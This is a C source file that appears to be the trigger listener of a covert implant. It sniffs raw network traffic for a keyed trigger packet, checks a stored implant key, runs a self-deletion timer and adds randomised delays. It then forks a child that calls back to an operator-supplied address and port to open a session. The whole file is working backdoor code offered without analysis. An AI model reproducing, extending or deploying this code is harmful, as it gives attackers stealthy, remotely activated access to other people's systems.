#include "debug.h"
#include "trigger_listen.h"
#include "trigger_callback_session.h"
#include "trigger_payload.h"
#include <errno.h>
#include "trigger_sniff.h"
#include "threads.h"
#include "compat.h"
#include "self_delete.h"
#include "proj_strings.h"

#include <stdlib.h>
#include <stddef.h>
#include <fcntl.h>  
#include <string.h>
#include <signal.h>
#include "crypto.h"
#include "polarssl/sha1.h"

#if defined LINUX || defined SOLARIS
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#endif

#if defined LINUX
#include <features.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#endif

#ifdef DEBUG
#include <arpa/inet.h>
#endif

extern unsigned char	ikey[ID_KEY_HASH_SIZE];		// Implant Key

#ifdef DEBUG
//define displaySha1Hash function
void printSha1Hash(char *label, unsigned char *sha1Hash)
{
	int i = 0;

	//Display Label
	printf("%s", label);

	//Display 40 hexadecimal number array
	for (i = 0; i < ID_KEY_HASH_SIZE; i++)
		printf("%02x", sha1Hash[i]);
}
#endif
//******************************************************************
//given a range will calculate a psuedo random variance
//within that range
//
//NOTES: range is the +-range so if you pass in 30
//       a number will be calculated between +-30
//       and be returned in variance
//
//RETURN: SUCCESS if generated a variance
//        variance will hold the returned variance

void CalcVariance( signed int* variance, int range )
{

	gen_random((unsigned char *)variance, sizeof(int));
	*variance %= range;

	DLX(6, printf( "CalcVariance() called. %i\n", *variance));

	return;
}

//******************************************************************
void TriggerDelay(int trigger_delay)
{
	//delay the trigger based on the patched value +- 30 
	//TODO: We check to see if its at least 30... but what if its a really High Bound?
	//      Is there something we should be checking for?
	signed int variance = 0;
	signed int calc_delay = 0;
	unsigned int delay = 0;

	CalcVariance( &variance, 30);
	DLX(4, printf("Calculated trigger delay variance: %d seconds\n", variance));

	calc_delay += trigger_delay + variance;
	delay = MAX(1, calc_delay); 					// this creates a minimum value of 1 second
	DLX(4, printf( "Preparing to sleep %d seconds.\n", delay));
	sleep(delay);

	return;
}

//******************************************************************
void* start_triggered_connect( void *param )
{
	TriggerInfo	tParams;

	// copy the parameters to the local stack and release the memory
	// now so we don't forget to do it later.
	memcpy( &tParams, param, sizeof( TriggerInfo ) );
	if ( param != NULL ) free( param );

#if DEBUG
	{
//		int	i;
		char	callback_address[INET_ADDRSTRLEN];
		printf("%s, %4d\n", __FILE__, __LINE__);
		printf("\t   Trigger Delay: %i\n", tParams.delay);
		printf("\tCallback Address: %s\n", inet_ntop(AF_INET, (const void*)&(tParams.callback_addr), callback_address, sizeof(callback_address)));
		printf("\t   Callback Port: %i\n", tParams.callback_port);
//		printf("\t    Trigger Port: %i\n", tParams.trigger_port);
//		printf("\t     ID Key Hash: \t");
		displaySha1Hash("\t     ID Key Hash: ", tParams.idKey_hash);
//		for (i = 0; i < ID_KEY_HASH_SIZE; i++)
//			printf("%c", tParams.idKey_hash[i]);
		printf("\n");
	}
#endif
	TriggerDelay( tParams.delay );

//	dt_exec_payload( &( tParams.Payload ) );
//	recvd_payload = &( tParams.Payload );

	DLX(4, printf("Preparing to exec...\n"));

	// IPv4 addresses only....
	{
		char	callback_address[INET_ADDRSTRLEN];

		inet_ntop(AF_INET, (const void*)&(tParams.callback_addr), callback_address, sizeof(callback_address));

	//	D( printf("%s, %4d: Received IP: %s\n", __FILE__, __LINE__, adrbuf ); )

		// TODO: it is also possible for connectbackListen() to return an error.
		// this error should be handled differently than ignoring it.
		if ( SHUTDOWN == TriggerCallbackSession(callback_address, tParams.callback_port) )
		{
			DL(4);
			D( return(0); )
			exit(0);
		}
	}
	// since this is a child process, it needs to exit
	D( return(0); )	// Return only for DEBUG, otherwise exit
	exit( 0 );
}

//******************************************************************

int TriggerListen(int trigger_delay, unsigned long delete_delay)
{
	int			socket_fd, packet_length;
	int 			counter = 0;
	unsigned char		packet_buffer[MAX_PKT];// MTU 2000, no pkts larger than this

	Payload 		recvd_payload;
	TriggerInfo		*tParams;
	struct sockaddr_ll	packet_info;
	size_t 			packet_info_size = sizeof( packet_info);


	DL(2);
	// reap any CHILD processes that die, prevent zombies
	// this is not needed because no processes are forked
	signal( SIGCHLD, sigchld_reaper );
  
	socket_fd = dt_get_socket_fd();
	DLX(2, printf("Listening for trigger on socket: %d\n", socket_fd));

	if( socket_fd == FAILURE )
	{
		DLX(2, printf("Exiting, cannot create socket!\n"));
		exit(-1);
	}

	//begin main loop that examines all incoming packets for encoded triggers 
	while(1)
	{
		if((counter % 100) == 0)
		{
			check_timer((char*)sdcfp, delete_delay);
		}

		memset( packet_buffer, 0, MAX_PKT );

		if ( ( packet_length = recvfrom( socket_fd, packet_buffer, MAX_PKT, 0, 
				(struct sockaddr *) &packet_info, (socklen_t *) &packet_info_size ) )  == FAILURE )
		{
			DLX(4, printf("Error: recvfrom() failure: %s\n", strerror(errno)));
			continue;
		}

		else
		{
			if ( dt_signature_check( packet_buffer, packet_length, &recvd_payload) == SUCCESS )
			{
				unsigned char	recvdKey[ID_KEY_HASH_SIZE];

				DLX(2, printf("Trigger signature found, about to send call back (will wait for trigger_delay)\n"));
				// this memory is free'd in the thread
				tParams = calloc( 1, sizeof( TriggerInfo ) );
				if (tParams == NULL) {
					DLX(2, printf("Calloc failed."));
					continue;	// If this fails, try again on next trigger.
				}

				// Populate the structure with the parameters needed inside the thread.
				if (payload_to_trigger_info(&recvd_payload, tParams) == FAILURE) {
					DLX(2, printf( "payload_to_trigger_info() failed.\n"));
					free(tParams);
					continue;	// If payload_to_trigger_info() fails, then the payload was corrupted. Listen for a trigger with a good payload.
				}

				sha1(tParams->idKey_hash, ID_KEY_HASH_SIZE, recvdKey);
				if ( memcmp(recvdKey, ikey, ID_KEY_HASH_SIZE) )	{// Compare keys. Trigger if identical; otherwise continue waiting for a match.
					D(
						printf("\n=============================================================================\n");
						printf("%s, %4d: IMPLANT TRIGGER FAILED -- KEY MISMATCH\n", __FILE__, __LINE__);
						printSha1Hash("\n\tTrigger Key: ", recvdKey);
						printSha1Hash("\n\tImplant Key: ", ikey);
						printf("\n\tCallback port: %i\n", tParams->callback_port);
						printf("\n=============================================================================\n\n");
					 );
					continue;
				}
				D(
					printf("\n=========================================================\n");
					printf("%s, %4d: IMPLANT TRIGGERED\n", __FILE__, __LINE__);
					printf("=========================================================\n\n");
				);

				tParams->delay = trigger_delay;

				update_file((char*)sdcfp);

				// Create child process... only the parent returns...the child will exit when finished.
				// Note: same function prototype as pthread_create()
#ifdef DEBUG	// Do not fork in DEBUG
				start_triggered_connect(tParams);
#else
				if ( fork_process( start_triggered_connect, (void *)tParams) != SUCCESS )
				{
					if ( tParams != NULL ) free( tParams );
					continue;	// If the fork fails, wait until next trigger and try again.
				}
#endif
				// main trigger thread loops to continue listening for additional trigger packets
			}
		}
		++counter;
	}

	// not reached.
	close( socket_fd );
	return 0;
}


#if defined LINUX || defined SOLARIS
void sigchld_reaper (int x)
{
  int waiter;
  pid_t pid;

	signal( SIGCHLD, sigchld_reaper );
  
	// just to silence the compiler warning
	(void) x;
  
  do {

    pid = waitpid (-1, &waiter, WNOHANG);

DLX(5,
    switch (pid) {
      
    case -1:
      printf("[%ld] sigchld...no children\n", (long) getpid () );
      break;
      
    case 0:	  
      printf("[%ld] sigchld...no dead kids\n", (long) getpid() );
      break;

    default:
      printf("[%ld] sigchld...pid #%ld died, stat=%d\n", (long) getpid (), (long) pid, WEXITSTATUS (waiter));
      break;

    }
);

  } while (pid > 0);

	return;
}
#endif
